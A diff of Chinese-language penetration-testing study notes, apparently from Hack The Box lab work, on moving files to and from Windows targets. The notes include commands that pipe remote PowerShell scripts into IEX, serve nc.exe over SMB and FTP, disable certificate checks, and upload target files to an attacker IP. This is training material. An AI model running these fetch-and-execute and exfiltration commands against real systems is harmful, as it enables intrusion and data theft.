@@ -18,6 +18,7 @@ cat id_rsa |base64 -w 0;echo                                       编码 id_rsa
 PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5      解码，核对 md5 哈希，但非常大的字符串，可能出错
 
 
+PowerShell 下载
 PowerShell 中，使用 System.Net.WebClient 类通过 HTTP、HTTPS 或 FTP 下载文件
   https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0
 
@@ -34,17 +35,50 @@ PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX  
 PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}      绕过证书不被信任
 
 
+SMB 下载
+sudo impacket-smbserver share -smb2support /tmp/smbshare                                在攻击机开启服务器
+  用 https://github.com/fortra/impacket/blob/master/examples/smbserver.py
+C:\htb> copy \\192.168.220.133\share\nc.exe                                             在目标下载文件
+如果报错
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test      在攻击机开启需要密码的服务器
+C:\htb> net use n: \\192.168.220.133\share /user:test test                              用 test:test，在在目标下载文件
+
+
+FTP 下载
+sudo pip3 install pyftpdlib              下载服务器
+sudo python3 -m pyftpdlib --port 21      在攻击机开启服务器
+PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')      在目标下载文件
+或
+C:\htb> echo open 192.168.49.128 > ftpcommand.txt
+C:\htb> echo USER anonymous >> ftpcommand.txt
+C:\htb> echo binary >> ftpcommand.txt
+C:\htb> echo GET file.txt >> ftpcommand.txt
+C:\htb> echo bye >> ftpcommand.txt                      把命令写入 ftpcommand.txt
+C:\htb> ftp -v -n -s:ftpcommand.txt                     执行 ftpcommand.txt
+ftp> open 192.168.49.128
+Log in with USER and PASS first.
+ftp> USER anonymous
+ftp> GET file.txt                                        从攻击机下载 file.txt
+ftp> bye
+C:\htb>more file.txt                                     读 file.txt
+
+
+PowerShell Web 从目标上传文件到攻击机
+pip3 install uploadserver                          在攻击机安装 Web 服务器
+  https://github.com/Densaugeo/uploadserver
+python3 -m uploadserver                            启动 Web 服务器
+PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')      从目标上传文件到攻击机
+PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts                                       从目标上传文件到攻击机
+PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))                                      在目标编码 hosts
+nc -lvnp 8000                                                                                                                                         在攻击机接收 哈希
+PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash      读 hosts 的哈希
+echo <base64> | base64 -d -w 0 > hosts                                                            在攻击机解码
+md5sum hosts                                                                                      核对哈希
 
 
 
-Windows download:
-  https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0
-  https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.6&viewFallbackFrom=powershell-7.2
 
-  https://gist.github.com/HarmJ0y/bb48307ffa663256e239
 
-  https://github.com/fortra/impacket/blob/master/examples/smbserver.py
-  then copy or mount
 
 Windows upload:
   https://github.com/Densaugeo/uploadserver
